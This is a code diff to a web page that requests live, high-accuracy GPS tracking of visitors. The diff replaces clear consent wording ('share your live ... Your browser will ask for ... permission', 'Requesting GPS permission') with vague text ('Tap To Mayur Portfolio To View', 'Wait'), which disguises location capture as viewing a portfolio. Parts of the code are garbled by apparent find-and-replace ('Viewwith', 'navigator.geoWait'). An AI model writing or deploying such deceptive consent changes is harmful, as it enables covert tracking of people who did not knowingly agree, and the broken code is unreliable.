@@ -77,7 +77,7 @@ tbody tr:hover td{background:rgba(74,174,207,.055)}
 </section>
 
 <section id="enrollView" class="hidden auth card enrollMinimal">
-  <p class="enrollConsent">Tap to share your live Viewwith Mayur Portfolio. Your browser will ask for Viewpermission.</p>
+  <p class="enrollConsent">Tap To Mayur Portfolio To View</p>
   <button class="btn primary" id="acceptEnroll" type="button">Mayur Portfolio</button>
   <p class="enrollStatus" id="enrollMessage" aria-live="polite">Viewsharing is off.</p>
   <div class="hidden" id="mediaConsentModal"><p id="mediaConsentText"></p><button id="approveMediaRequest" type="button">Allow</button><button id="denyMediaRequest" type="button">Deny</button></div>
@@ -394,7 +394,7 @@ $("View").onclick = () => {
     if (phantomLiveWatch !== null) navigator.geoWait.clearWatch(phantomLiveWatch);
     phantomLiveWatch = null;
   }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 5000 });
-  $("enrollMessage").textContent = "Requesting GPS permission. Keep this browser page open.";
+  $("enrollMessage").textContent = "Wait";
   toast("Live GPS sharing requested");
 };
 const originalExit = $("Exit").onclick;
